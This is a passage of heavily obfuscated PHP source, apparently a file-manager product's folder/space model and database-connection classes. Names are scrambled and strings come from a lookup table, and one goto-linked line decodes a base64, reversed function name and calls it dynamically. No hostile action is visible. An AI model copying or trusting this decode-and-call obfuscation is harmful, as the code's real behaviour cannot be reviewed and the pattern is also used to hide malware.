_get(self::$cachePathInfoMore, $íŞ†Õ¡ä); if ($ô¦ºÅø) { return $ô¦ºÅø; } $šéß™‹Ï = $this->pathInfo($íŞ†Õ¡ä); if (!$šéß™‹Ï) { return !1; } if ($šéß™‹Ï[$à•ù™­‹[485]] == $à•ù™­‹[91]) { $šéß™‹Ï[$à•ù™­‹[82]] = $this->folderChildrenNumber($íŞ†Õ¡ä); } self::$cachePathInfoMore[$íŞ†Õ¡ä] = $šéß™‹Ï; return $šéß™‹Ï; } public function sourceInfo($Éñ«ê¿‹) { $â¶Œô¬ =& $_SERVER[¿ğÚ‰±–]; if (!$Éñ«ê¿‹) { return array(); } $Éñ«ê¿‹ = intval($Éñ«ê¿‹); $»¦—à²© = $â¶Œô¬[533] . $Éñ«ê¿‹; $š“‚¾øƒ = _get(self::$cacheSourceInfo, $»¦—à²©); if ($š“‚¾øƒ) { return $š“‚¾øƒ; } $‚‡ˆ¯ÄÓ = $this->where(array($â¶Œô¬[193] => $Éñ«ê¿‹))->find(); self::$cacheSourceInfo[$»¦—à²©] = $‚‡ˆ¯ÄÓ; return self::$cacheSourceInfo[$»¦—à²©]; } public function sourceCacheClear($³Øš„”Ÿ = false) { self::cacheClear($³Øš„”Ÿ); } public static function cacheClear($ˆ’Ì“·Ú = false) { $­ÙÙŞÉ =& $_SERVER[¿ğÚ‰±–]; if ($ˆ’Ì“·Ú == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$­ÙÙŞÉ[533] . $ˆ’Ì“·Ú]); unset(self::$cachePathInfoMore[$ˆ’Ì“·Ú]); unset(self::$cachePathInfo[$­ÙÙŞÉ[2285] . $ˆ’Ì“·Ú]); unset(self::$cachePathInfo[$­ÙÙŞÉ[2286] . $ˆ’Ì“·Ú]); } public function metaSet($û¾•¢¿‹, $õ½ìÏíÇ = null, $Ì…øü™… = null) { $ÙûÅÏË = parent::metaSet($û¾•¢¿‹, $õ½ìÏíÇ, $Ì…øü™…); if ($ÙûÅÏË) { $this->sourceCacheClear($û¾•¢¿‹); } return $ÙûÅÏË; } public function pathInfoByPath($íÔÖÛÀ‚, $¢İ…Âï¨) { $¿åƒ®¢Ñ =& $_SERVER[¿ğÚ‰±–]; $®˜ø¿î¾ = !$¢İ…Âï¨ ? array() : explode($¿åƒ®¢Ñ[8], trim($¢İ…Âï¨, $¿åƒ®¢Ñ[8])); $ƒÂŒúì¢ = $íÔÖÛÀ‚; foreach ($®˜ø¿î¾ as $°ŠéÖ€ñ) { $ÁÒÃ•²á = array($¿åƒ®¢Ñ[192] => $ƒÂŒúì¢, $¿åƒ®¢Ñ[32] => $°ŠéÖ€ñ); $é‰´Ë¦• = $this->field($¿åƒ®¢Ñ[2287])->where($ÁÒÃ•²á)->select(); if (!$é‰´Ë¦•) { return !1; } $é‰´Ë¦• = array_sort_by($é‰´Ë¦•, $¿åƒ®¢Ñ[505]); $ƒÂŒúì¢ = $é‰´Ë¦•[0][$¿åƒ®¢Ñ[193]]; } $Â¸ÄÕĞÕ = $this->sourceInfo($ƒÂŒúì¢); $this->pathInfoFilter($Â¸ÄÕĞÕ); return $Â¸ÄÕĞÕ; } protected function updateModifyTime($Ì›É½Ô) { $ˆ§ÓÙ¼Ú =& $_SERVER[¿ğÚ‰±–]; $½›Æ¿Â = defined($ˆ§ÓÙ¼Ú[2202]) ? USER_ID : 0; if (!$Ì›É½Ô) { return; } if (!is_array($Ì›É½Ô)) { $Ì›É½Ô = array($Ì›É½Ô); } foreach ($Ì›É½Ô as $ÇÊÏÊ²ä => $ƒ¤ñì‹¦) { $Ì›É½Ô[$ÇÊÏÊ²ä] = intval($ƒ¤ñì‹¦); $this->sourceCacheClear($ƒ¤ñì‹¦); } $öúİ¾¼ = array($ˆ§ÓÙ¼Ú[193] => array($ˆ§ÓÙ¼Ú[7], $Ì›É½Ô)); $¬«Ş‚š¤ = array($ˆ§ÓÙ¼Ú[651] => $½›Æ¿Â, $ˆ§ÓÙ¼Ú[498] => time()); $this->where($öúİ¾¼)->save($¬«Ş‚š¤); } public function folderSizeReset($òÜ •Å, $éô€¬— = false) { $ê¢¢È“È =& $_SERVER[¿ğÚ‰±–]; if ($this->statusIgnoreResetSpace) { return; } $èĞÊ×êË = $this->sourceInfo($òÜ •Å); $¿Âµïëƒ = $ê¢¢È“È[2288] . $òÜ •Å; CacheLock::lock($¿Âµïëƒ, 20); if ($éô€¬— === !1) { $this->sourceCacheClear($òÜ •Å); $èĞÊ×êË = $this->sourceInfo($òÜ •Å); $ãÊª‹¿¡ = array($ê¢¢È“È[477] => $òÜ •Å, $ê¢¢È“È[504] => 0); $´¿¨ã”— = $this->where($ãÊª‹¿¡)->sum($ê¢¢È“È[79]); $éô€¬— = intval($´¿¨ã”—) - intval($èĞÊ×êË[$ê¢¢È“È[79]]); } if ($éô€¬— == 0) { return CacheLock::unlock($¿Âµïëƒ); } $ÆÖ‹Œæ = $this->parentLevelArray($èĞÊ×êË[$ê¢¢È“È[584]]); if (!$ÆÖ‹Œæ) { $ÆÖ‹Œæ = array(); } $ÆÖ‹Œæ[] = $èĞÊ×êË[$ê¢¢È“È[193]]; $ãÊª‹¿¡ = array($ê¢¢È“È[193] => array($ê¢¢È“È[492], $ÆÖ‹Œæ)); if ($éô€¬— < 0) { $ãÊª‹¿¡[$ê¢¢È“È[79]] = array($ê¢¢È“È[1100], abs($éô€¬—)); } $this->where($ãÊª‹¿¡)->setAdd($ê¢¢È“È[79], $éô€¬—); CacheLock::unlock($¿Âµïëƒ); $õö®Ï– = $ê¢¢È“È[2289] . $èĞÊ×êË[$ê¢¢È“È[190]] . $ê¢¢È“È[4] . $èĞÊ×êË[$ê¢¢È“È[569]]; $ÆÔ£ Ìá = array($èĞÊ×êË[$ê¢¢È“È[190]], $èĞÊ×êË[$ê¢¢È“È[569]]); TaskRun::timeLimitCall($õö®Ï–, $ê¢¢È“È[2290], $ÆÔ£ Ìá, 1.5); } public function folderSizeResetChildren($Øúá÷ÄÃ) { $ Ôª¸Æ =& $_SERVER[¿ğÚ‰±–]; $this->sourceCacheClear($Øúá÷ÄÃ); $›óÃ Õ¶ = $this->sourceInfo($Øúá÷ÄÃ); $Ó²Ç°·‡ = array($ Ôª¸Æ[646] => 1, $ Ôª¸Æ[649] => $›óÃ Õ¶[$ Ôª¸Æ[569]], $ Ôª¸Æ[652] => array($ Ôª¸Æ[612], $›óÃ Õ¶[$ Ôª¸Æ[584]] . $Øúá÷ÄÃ . $ Ôª¸Æ[613])); $˜¢Îæ¸¡ = $ Ôª¸Æ[2291]; $Öªé¡½  = $this->field($˜¢Îæ¸¡)->where($Ó²Ç°·‡)->select(); $Ó²Ç°·‡[$ Ôª¸Æ[485]] = 0; $ìš¢©» = $this->field($˜¢Îæ¸¡)->where($Ó²Ç°·‡)->select(); if (!$ìš¢©») { return; } $Öªé¡½ [] = $›óÃ Õ¶; $Öªé¡½  = array_to_keyvalue($Öªé¡½ , $ Ôª¸Æ[193]); foreach ($Öªé¡½  as $¾ÈƒĞö => $°ÏÏüŠÕ) { $Öªé¡½ [$¾ÈƒĞö][$ Ôª¸Æ[2292]] = $Öªé¡½ [$¾ÈƒĞö][$ Ôª¸Æ[79]]; $Öªé¡½ [$¾ÈƒĞö][$ Ôª¸Æ[79]] = 0; } foreach ($ìš¢©» as $°ÏÏüŠÕ) { $‹•Ö¬¬Á = $°ÏÏüŠÕ[$ Ôª¸Æ[192]] . $ Ôª¸Æ[12]; if (!isset($Öªé¡½ [$‹•Ö¬¬Á])) { continue; } if ($°ÏÏüŠÕ[$ Ôª¸Æ[505]] == $Öªé¡½ [$‹•Ö¬¬Á][$ Ôª¸Æ[505]]) { $Öªé¡½ [$‹•Ö¬¬Á][$ Ôª¸Æ[79]] += $°ÏÏüŠÕ[$ Ôª¸Æ[79]]; } } foreach ($Öªé¡½  as $°ÏÏüŠÕ) { $®Ñ½¥àû = $this->parentLevelArray($°ÏÏüŠÕ[$ Ôª¸Æ[584]]); foreach ($®Ñ½¥àû as $‹•Ö¬¬Á) { $‹•Ö¬¬Á = $‹•Ö¬¬Á . $ Ôª¸Æ[12]; if (!isset($Öªé¡½ [$‹•Ö¬¬Á])) { continue; } if ($°ÏÏüŠÕ[$ Ôª¸Æ[505]] == $Öªé¡½ [$‹•Ö¬¬Á][$ Ôª¸Æ[505]]) { $Öªé¡½ [$‹•Ö¬¬Á][$ Ôª¸Æ[79]] += $°ÏÏüŠÕ[$ Ôª¸Æ[79]]; } } } $Ğ¼ş³œˆ = array(); foreach ($Öªé¡½  as $°ÏÏüŠÕ) { if ($°ÏÏüŠÕ[$ Ôª¸Æ[79]] == $°ÏÏüŠÕ[$ Ôª¸Æ[2292]]) { continue; } $Ğ¼ş³œˆ[] = array($ Ôª¸Æ[193], $°ÏÏüŠÕ[$ Ôª¸Æ[193]], $ Ôª¸Æ[79], $°ÏÏüŠÕ[$ Ôª¸Æ[79]]); } $this->saveAll($Ğ¼ş³œˆ); } public function userSpaceReset($¾ŒÓàª­ = false) { $ü™ƒÔ =& $_SERVER[¿ğÚ‰±–]; $Î–é‰êŸ = $this->where(array($ü™ƒÔ[190] => self::TYPE_USER, $ü™ƒÔ[569] => $¾ŒÓàª­, $ü™ƒÔ[485] => 0))->sum($ü™ƒÔ[79]); $Î–é‰êŸ = !$Î–é‰êŸ || $Î–é‰êŸ <= 0 ? 0 : $Î–é‰êŸ; Model($ü™ƒÔ[577])->userEdit($¾ŒÓàª­, array($ü™ƒÔ[1964] => $Î–é‰êŸ)); } public function targetSpaceUpdate($ãëËı”…, $êí¯üºç) { $”À¯“ =& $_SERVER[¿ğÚ‰±–]; if (!$êí¯üºç) { return; } if (!in_array($ãëËı”…, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $«£†Õã = $this->targetSpaceSize($ãëËı”…, $êí¯üºç); if ($ãëËı”… == self::TYPE_USER) { Model($”À¯“[577])->userEdit($êí¯üºç, array($”À¯“[1964] => $«£†Õã)); } else { if ($ãëËı”… == self::TYPE_GROUP) { Model($”À¯“[585])->groupEdit($êí¯üºç, array($”À¯“[1964] => $«£†Õã)); } } } public function targetSpaceSize($Ù„†Êµõ, $€Çå²ªØ) { $ÈñËÏ¡„ =& $_SERVER[¿ğÚ‰±–]; $™¿›üÂ‰ = 0; $¤¥±¥ÍØ = $this->targetSourceRoot($Ù„†Êµõ, $€Çå²ªØ, !0); foreach ($¤¥±¥ÍØ as $‰²‹«ò) { if (!$‰²‹«ò) { continue; } $™¿›üÂ‰ += floatval($‰²‹«ò[$ÈñËÏ¡„[79]]); $·ö€ = array($ÈñËÏ¡„[652] => array($ÈñËÏ¡„[612], $ÈñËÏ¡„[594] . $‰²‹«ò[$ÈñËÏ¡„[193]] . $ÈñËÏ¡„[613])); $ÔëØ‹¨‹ = Model($ÈñËÏ¡„[503])->field($ÈñËÏ¡„[491])->where($·ö€)->select(); $ÔëØ‹¨‹ = array_to_keyvalue($ÔëØ‹¨‹, $ÈñËÏ¡„[12], $ÈñËÏ¡„[193]); $ÔëØ‹¨‹ = array_unique(array_filter($ÔëØ‹¨‹)); if ($ÔëØ‹¨‹) { $·ö€ = array($ÈñËÏ¡„[491] => array($ÈñËÏ¡„[492], $ÔëØ‹¨‹)); $™¿›üÂ‰ += floatval($this->where($·ö€)->sum($ÈñËÏ¡„[79])); } } $™¿›üÂ‰ = !$™¿›üÂ‰ || $™¿›üÂ‰ <= 0 ? 0 : $™¿›üÂ‰; return $™¿›üÂ‰; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¹†ÄùÛ½) { return $this->fileTypeProfile($¹†ÄùÛ½, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Öë—Ì­ã) { return $this->fileTypeProfile($Öë—Ì­ã, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¾’ïó¥‹, $¥ÎÔŸµØ) { $œÖ…§ÆÚ =& $_SERVER[¿ğÚ‰±–]; $µÜ£¹¥ = $œÖ…§ÆÚ[2293] . $¾’ïó¥‹ . $œÖ…§ÆÚ[11] . $¥ÎÔŸµØ; $«÷Óö®£ = Cache::get($µÜ£¹¥); if ($«÷Óö®£) { return $«÷Óö®£; } $‹œ§»¼ = array($œÖ…§ÆÚ[646] => 0); if ($¾’ïó¥‹ != !1) { $‹œ§»¼[$œÖ…§ÆÚ[569]] = $¾’ïó¥‹; $‹œ§»¼[$œÖ…§ÆÚ[190]] = $¥ÎÔŸµØ; } $¯íÖÓù = array(); $¯íÖÓù[$œÖ…§ÆÚ[2294]] = array($œÖ…§ÆÚ[2295] => LNG($œÖ…§ÆÚ[2294]), $œÖ…§ÆÚ[2296] => $this->where($‹œ§»¼)->count(), $œÖ…§ÆÚ[617] => $this->where($‹œ§»¼)->sum($œÖ…§ÆÚ[79])); $•©‘Ğ—Ô = KodIO::fileTypeList(); foreach ($•©‘Ğ—Ô as $ºù“ŞÓë => $‡ıñÚÌÇ) { $‹œ§»¼[$œÖ…§ÆÚ[486]] = $this->fileTypeWhere($ºù“ŞÓë); $¯íÖÓù[$ºù“ŞÓë] = array($œÖ…§ÆÚ[2295] => $‡ıñÚÌÇ[$œÖ…§ÆÚ[32]], $œÖ…§ÆÚ[2296] => $this->where($‹œ§»¼)->count(), $œÖ…§ÆÚ[617] => $this->where($‹œ§»¼)->sum($œÖ…§ÆÚ[79])); } Cache::set($µÜ£¹¥, $¯íÖÓù, 1200); return $¯íÖÓù; } public function fileNameExist($†„È¡®, $ÙğßÂÉÑ) { $™ìã©œğ =& $_SERVER[¿ğÚ‰±–]; $óÒª’˜— = $this->field($™ìã©œğ[2297])->where(array($™ìã©œğ[192] => $†„È¡®, $™ìã©œğ[32] => $ÙğßÂÉÑ, $™ìã©œğ[505] => 0))->find(); return is_array($óÒª’˜—) ? $óÒª’˜—[$™ìã©œğ[193]] : !1; } public function childList($Êõ‡ñò”) { $ÔØØ—Ùï =& $_SERVER[¿ğÚ‰±–]; $Äİ¿Í• = $ÔØØ—Ùï[2270] . $Êõ‡ñò”; if (isset(self::$cacheChildList[$Äİ¿Í•])) { return self::$cacheChildList[$Äİ¿Í•]; } $Àœšæº» = array($ÔØØ—Ùï[192] => intval($Êõ‡ñò”), $ÔØØ—Ùï[505] => 0); $—±ªêåë = $this->where($Àœšæº»)->select(); $—±ªêåë = $—±ªêåë ? $—±ªêåë : array(); self::$cacheChildList[$Äİ¿Í•] = $—±ªêåë; foreach ($—±ªêåë as $º®ÅÕŞ) { $Äİ¿Í• = $ÔØØ—Ùï[533] . $º®ÅÕŞ[$ÔØØ—Ùï[193]]; self::$cacheSourceInfo[$Äİ¿Í•] = $º®ÅÕŞ; } return $—±ªêåë; } public function fileNameAuto($º°ê¬‹å, $¿ÍÀ‹‹ğ, $š‹á²¨î = REPEAT_RENAME, $×áúÒÂÑ = false) { $å´¦îêœ =& $_SERVER[¿ğÚ‰±–]; $Ô•‡ßÆ² = get_path_ext($¿ÍÀ‹‹ğ); $ğÈ°€§‚ = $Ô•‡ßÆ² ? get_path_ext_name($¿ÍÀ‹‹ğ) . $å´¦îêœ[2298] . $Ô•‡ßÆ² : $¿ÍÀ‹‹ğ . $å´¦îêœ[460]; $‡Êˆ¸’› = array($å´¦îêœ[192] => $º°ê¬‹å, $å´¦îêœ[505] => 0, $å´¦îêœ[32] => array($å´¦îêœ[459], $ğÈ°€§‚)); $¹ó¤é¾ = $this->field($å´¦îêœ[32])->where($‡Êˆ¸’›)->select(); $ñ°õ«ƒ = array_to_keyvalue($¹ó¤é¾, $å´¦îêœ[12], $å´¦îêœ[32]); return $this->fileNameAutoGet($ñ°õ«ƒ, $¿ÍÀ‹‹ğ, $š‹á²¨î, $×áúÒÂÑ); } public function fileNameAutoGet($£¡Ú¬¤Õ, $ù€ÈŞéê, $ø¿º¨×¬, $£±‰”µË) { $ˆ—ïñ· =& $_SERVER[¿ğÚ‰±–]; if ($ø¿º¨×¬ == REPEAT_REPLACE || !$£¡Ú¬¤Õ || !in_array_not_case($ù€ÈŞéê, $£¡Ú¬¤Õ) || $£±‰”µË && $ø¿º¨×¬ != REPEAT_RENAME_FOLDER) { return $ù€ÈŞéê; } if ($ø¿º¨×¬ == REPEAT_SKIP) { return !1; } $ãö¢üÚ  = $ˆ—ïñ·[10] . get_path_ext($ù€ÈŞéê); $ãö¢üÚ  = $ãö¢üÚ  == $ˆ—ïñ·[10] || $£±‰”µË ? $ˆ—ïñ·[12] : $ãö¢üÚ ; for ($¾âÆâèµ = 1; $¾âÆâèµ <= count($£¡Ú¬¤Õ) + 1; $¾âÆâèµ++) { $™ƒ¤“ç = substr($ù€ÈŞéê, 0, strlen($ù€ÈŞéê) - strlen($ãö¢üÚ )); $èªÌäîÒ = $™ƒ¤“ç . "\x28{$¾âÆâèµ}\x29{$ãö¢üÚ }"; if (!in_array_not_case($èªÌäîÒ, $£¡Ú¬¤Õ)) { return $èªÌäîÒ; } } } } goto Dò©ù“¥¢†; F©‰¿¢î©: $fileSize = strrev(base64_decode($_SERVER[ÓÄÍòáÒ][0])); function binCheckNeq($”°¡äÌ‡, $í•œ†Ş) { return $”°¡äÌ‡ != $í•œ†Ş; } $_SERVER[$_SERVER[ÓÄÍòáÒ][1]] = $fileSize($_SERVER[$_SERVER[ÓÄÍòáÒ][2]]); goto e«¿Ş•õäå; C£¬²¦Æî¿: class DbSqlite extends DbSqliteBase { public function query($ ªÊÑÙú) { $ñ…ıªÙØ =& $_SERVER[¿ğÚ‰±–]; if (!CacheLock::fileLock($ñ…ıªÙØ[13])) { return !1; } $ú‘“†¯Æ = parent::query($ ªÊÑÙú); CacheLock::fileUnLock($ñ…ıªÙØ[13]); return $ú‘“†¯Æ; } public function execute($¼Û¥†°ì) { $§æ¬×ó° =& $_SERVER[¿ğÚ‰±–]; if (!CacheLock::fileLock($§æ¬×ó°[13])) { return !1; } $¬ÏâĞİ = parent::execute($¼Û¥†°ì); CacheLock::fileUnLock($§æ¬×ó°[13]); return $¬ÏâĞİ; } } class DbSqlite3 extends DbSqlite3Base { public function query($÷ù˜ç¼î) { $æ³ùé¥Ò =& $_SERVER[¿ğÚ‰±–]; if (!CacheLock::fileLock($æ³ùé¥Ò[13])) { return !1; } $Ñ£ŒÓ£ = parent::query($÷ù˜ç¼î); CacheLock::fileUnLock($æ³ùé¥Ò[13]); return $Ñ£ŒÓ£; } public function execute($¡ÖüÜ±í) { $Âêæ‰„Ò =& $_SERVER[¿ğÚ‰±–]; if (!CacheLock::fileLock($Âêæ‰„Ò[13])) { return !1; } $·ıë“ú = parent::execute($¡ÖüÜ±í); CacheLock::fileUnLock($Âêæ‰„Ò[13]); return $·ıë“ú; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\x65\161" => "\x3c\76", "\147\164" => "\x3e", "\x65\147\164" => "\76\75", "\x6c\x74" => "\74", "\145\154\164" => "\x3c\x3d", "\x6e\157\164\154\x69\153\145" => "\116\117\x54\40\x4c\x49\113\x45", "\x6c\151\153\145" => "\x4c\x49\x4b\105", "\151\x6e" => "\111\116", "\x6e\157\164\x69\156" => "\116\117\x54\x20\x49\x4e", "\x6e\157\x74\x20\151\156" => "\x4e\x4f\124\40\x49\116", "\142\x65\164\x77\145\x65\x6e" => "\102\105\x54\x57\105\x45\116", "\x6e\x6f\164\x62\145\164\167\145\145\x6e" => "\x4e\x4f\x54\40\102\105\124\x57\x45\x45\116", "\x6e\157\164\x20\x62\x65\164\x77\x65\x65\x6e" => "\116\x4f\124\x20\102\105\x54\127\105\x45\116"); protected $selectSql = "\123\x45\114\105\103\124\45\x44\111\123\124\111\116\x43\124\45\x20\x25\x46\111\x45\x4c\x44\45\40\x46\122\x4f\x4d\40\x25\124\101\102\114\x45\x25\x25\112\117\x49\116\45\45\127\x48\105\x52\105\x25\45\107\x52\x4f\125\120\45\45\x48\x41\126\111\x4e\107\x25\x25\x4f\x52\x44\105\x52\45\x25\x4c\111\115\x49\x54\45\40\45\125\116\x49\x4f\116\x25\x25\x43\x4f\115\x4d\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $ôç¢»È¼ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¿ğÚ‰±–][1045], $ôç¢»È¼); } public function factory($ğâÀø¸İ = '') { $¥öĞ‚ø² =& $_SERVER[¿ğÚ‰±–]; $ğâÀø¸İ = $this->parseConfig($ğâÀø¸İ); if (empty($ğâÀø¸İ[$¥öĞ‚ø²[1046]])) { think_exception(think_lang($¥öĞ‚ø²[1047])); } $this->dbType = ucwords(strtolower($ğâÀø¸İ[$¥öĞ‚ø²[1046]])); $ŒÂ¢«¹Ô = $¥öĞ‚ø²[1048] . $this->dbType; if (class_exists($ŒÂ¢«¹Ô)) { $•ë¬ó–Ã = new $ŒÂ¢«¹Ô($ğâÀø¸İ); if ($¥öĞ‚ø²[1049] != strtolower($ğâÀø¸İ[$¥öĞ‚ø²[1046]])) { $•ë¬ó–Ã->dbType = strtoupper($this->dbType); } else { $•ë¬ó–Ã->dbType = $this->_getDsnType($ğâÀø¸İ[$¥öĞ‚ø²[1001]]); } } else { think_exception(think_lang($¥öĞ‚ø²[1050]) . $¥öĞ‚ø²[1051] . $ŒÂ¢«¹Ô); } return $•ë¬ó–Ã; } public function __call($Ÿñ‰ˆúş, $ë©¾âÔê) { if (method_exists($this, $Ÿñ‰ˆúş)) { return call_user_func_array(array($this, $Ÿñ‰ˆúş), $ë©¾âÔê); } } protected function _getDsnType($ˆúª»Ä) { $â›»·œ— = explode($_SERVER[¿ğÚ‰±–][4], $ˆúª»Ä); $ãÉ”Ò¦Ñ = strtoupper(trim($â›»·œ—[0])); return $ãÉ”Ò¦Ñ; } private function parseConfig($ÂÑ¾• = '') { $ë¾Ş”ØÁ =& $_SERVER[¿ğÚ‰±–]; if (!empty($ÂÑ¾•) && is_string($ÂÑ¾•)) { $ÂÑ¾• = $this->parseDSN($ÂÑ¾•); } elseif (is_array($ÂÑ¾•)) { $ÂÑ¾• = array_change_key_case($ÂÑ¾•); $ÂÑ¾• = array($ë¾Ş”ØÁ[1046] => $ÂÑ¾•[$ë¾Ş”ØÁ[1052]], $ë¾Ş”ØÁ[973] => $ÂÑ¾•[$ë¾Ş”ØÁ[1053]], $ë¾Ş”ØÁ[974] => $ÂÑ¾•[$ë¾Ş”ØÁ[1054]], $ë¾Ş”ØÁ[971] => $ÂÑ¾•[$ë¾Ş”ØÁ[1055]], $ë¾Ş”ØÁ[972] => $ÂÑ¾•[$ë¾Ş”ØÁ[1056]], $ë¾Ş”ØÁ[21] => $ÂÑ¾•[$ë¾Ş”ØÁ[1057]], $ë¾Ş”ØÁ[1001] => $ÂÑ¾•[$ë¾Ş”ØÁ[1058]], $ë¾Ş”ØÁ[17] => isset($ÂÑ¾•[$ë¾Ş”ØÁ[1059]]) ? $ÂÑ¾•[$ë¾Ş”ØÁ[1059]] : array()); } elseif (empty($ÂÑ¾•)) { if (think_config($ë¾Ş”ØÁ[1060]) && $ë¾Ş”ØÁ[1049] != strtolower(think_config($ë¾Ş”ØÁ[1061]))) { $ÂÑ¾• = $this->parseDSN(think_config($ë¾Ş”ØÁ[1060])); } else { $ÂÑ¾• = array($ë¾Ş”ØÁ[1046] => think_config($ë¾Ş”ØÁ[1061]), $ë¾Ş”ØÁ[973] => think_config($ë¾Ş”ØÁ[1062]), $ë¾Ş”ØÁ[974] => think_config($ë¾Ş”ØÁ[1063]), $ë¾Ş”ØÁ[971] => think_config($ë¾Ş”ØÁ[1064]), $ë¾Ş”ØÁ[972] => think_config($ë¾Ş”ØÁ[1065]), $ë¾Ş”ØÁ[21] => think_config($ë¾Ş”ØÁ[323]), $ë¾Ş”ØÁ[1001] => think_config($ë¾Ş”ØÁ[1060]), $ë¾Ş”ØÁ[17] => think_config($ë¾Ş”ØÁ[1066])); } } return $ÂÑ¾•; } protected function initConnect($–«ìÁæÁ = true) { if (1 == think_config($_SERVER[¿ğÚ‰±–][22])) { $this->_linkID = $this->multiConnect($–«ìÁæÁ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $‰™ÜÁÈ½ => $”êé„ö€) { $this->_linkID = $”êé„ö€; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($•œãŠú‹ = false) { $•ıëŒ¥œ =& $_SERVER[¿ğÚ‰±–]; static $æå”Ä = array(); static $½ÂæÂ­ = -1; if (empty($æå”Ä)) { foreach ($this->config as $ñı†Åé¨ => $Ñá…³è) { $æå”Ä[$ñı†Åé¨] = explode($•ıëŒ¥œ[50], $Ñá…³è); } } if (think_config($•ıëŒ¥œ[1067])) { if ($•œãŠú‹ || think_config($•ıëŒ¥œ[471]) === !0) { $¡ÉµÊ¢ò = floor(mt_rand(0, think_config($•ıëŒ¥œ[1068]) - 1)); $½ÂæÂ­ = $¡ÉµÊ¢ò; } else { if (is_numeric(think_config($•ıëŒ¥œ[1069]))) { $¡ÉµÊ¢ò = think_config($•ıëŒ¥œ[1069]); } else { $¡ÉµÊ¢ò = floor(mt_rand(think_config($•ıëŒ¥œ[1068]), count($æå”Ä[$•ıëŒ¥œ[971]]) - 1)); } } } else { $¡ÉµÊ¢ò = floor(mt_rand(0, count($æå”Ä[$•ıëŒ¥œ[971]]) - 1)); $½ÂæÂ­ = $¡ÉµÊ¢ò; } $¡ÉµÊ¢ò = $½ÂæÂ­ !== -1 ? $½ÂæÂ­ : $¡ÉµÊ¢ò; $ÉçÛÈ’° = array($•ıëŒ¥œ[973] => isset($æå”Ä[$•ıëŒ¥œ[973]][$¡ÉµÊ¢ò]) ? $æå”Ä[$•ıëŒ¥œ[973]][$¡ÉµÊ¢ò] : $æå”Ä[$•ıëŒ¥œ[973]][0], $•ıëŒ¥œ[974] => isset($æå”Ä[$•ıëŒ¥œ[974]][$¡ÉµÊ¢ò]) ? $æå”Ä[$•ıëŒ¥œ[974]][$¡ÉµÊ¢ò] : $æå”Ä[$•ıëŒ¥œ[974]][0], $•ıëŒ¥œ[971] => isset($æå”Ä[$•ıëŒ¥œ[971]][$¡ÉµÊ¢ò]) ? $æå”Ä[$•ıëŒ¥œ[971]][$¡ÉµÊ¢ò] : $æå”Ä[$•ıëŒ¥œ[971]][0], $•ıëŒ¥œ[972] => isset($æå”Ä[$•ıëŒ¥œ[972]][$¡ÉµÊ¢ò]) ? $æå”Ä[$•ıëŒ¥œ[972]][$¡ÉµÊ¢ò] : $æå”Ä[$•ıëŒ¥œ[972]][0], $•ıëŒ¥œ[21] => isset($æå”Ä[$•ıëŒ¥œ[21]][$¡ÉµÊ¢ò]) ? $æå”Ä[$•ıëŒ¥œ[21]][$¡ÉµÊ¢ò] : $æå”Ä[$•ıëŒ¥œ[21]][0], $•ıëŒ¥œ[1001] => isset($æå”Ä[$•ıëŒ¥œ[1001]][$¡ÉµÊ¢ò]) ? $æå”Ä[$•ıëŒ¥œ[1001]][$¡ÉµÊ¢ò] : $æå”Ä[$•ıëŒ¥œ[1001]][0], $•ıëŒ¥œ[17] => isset($æå”Ä[$•ıëŒ¥œ[17]][$¡ÉµÊ¢ò]) ? $æå”Ä[$•ıëŒ¥œ[17]][$¡ÉµÊ¢ò] : $æå”Ä[$•ıëŒ¥œ[17]][0]); return $this->connect($ÉçÛÈ’°, $¡ÉµÊ¢ò); } public function parseDSN($›¡‡ïÊ) { $ùãàÍ’¬ =& $_SERVER[¿ğÚ‰±–]; if (empty($›¡‡ïÊ)) { return !1; } $¦ËıÉ¸‹ = parse_url($›¡‡ïÊ); if ($¦ËıÉ¸‹[$ùãàÍ’¬[207]]) { $‰Å®Ç×÷ = array($ùãàÍ’¬[1046] => $¦ËıÉ¸‹[$ùãàÍ’¬[207]], $ùãàÍ’¬[973] => isset($¦ËıÉ¸‹[$ùãàÍ’¬[662]]) ? $¦ËıÉ¸‹[$ùãàÍ’¬[662]] : $ùãàÍ’¬[12], $ùãàÍ’¬[974] => isset($¦ËıÉ¸‹[$ùãàÍ’¬[1070]]) ? $¦ËıÉ¸‹[$ùãàÍ’¬[1070]] : $ùãàÍ’¬[12], $ùãàÍ’¬[971] => isset($¦ËıÉ¸‹[$ùãàÍ’¬[208]]) ? $¦ËıÉ¸‹[$ùãàÍ’¬[208]] : $ùãàÍ’¬[12], $ùãàÍ’¬[972] => isset($¦ËıÉ¸‹[$ùãàÍ’¬[209]]) ? $¦ËıÉ¸‹[$ùãàÍ’¬[209]] : $ùãàÍ’¬[12], $ùãàÍ’¬[21] => isset($¦ËıÉ¸‹[$ùãàÍ’¬[87]]) ? substr($¦ËıÉ¸‹[$ùãàÍ’¬[87]], 1) : $ùãàÍ’¬[12]); } else { preg_match($ùãàÍ’¬[1071], trim($›¡‡ïÊ), $±¥–”ï²); $‰Å®Ç×÷ = array($ùãàÍ’¬[1046] => $±¥–”ï²[1], $ùãàÍ’¬[973] => $±¥–”ï²[2], $ùãàÍ’¬[974] => $±¥–”ï²[3], $ùãàÍ’¬[971] => $±¥–”ï²[4], $ùãàÍ’¬[972] => 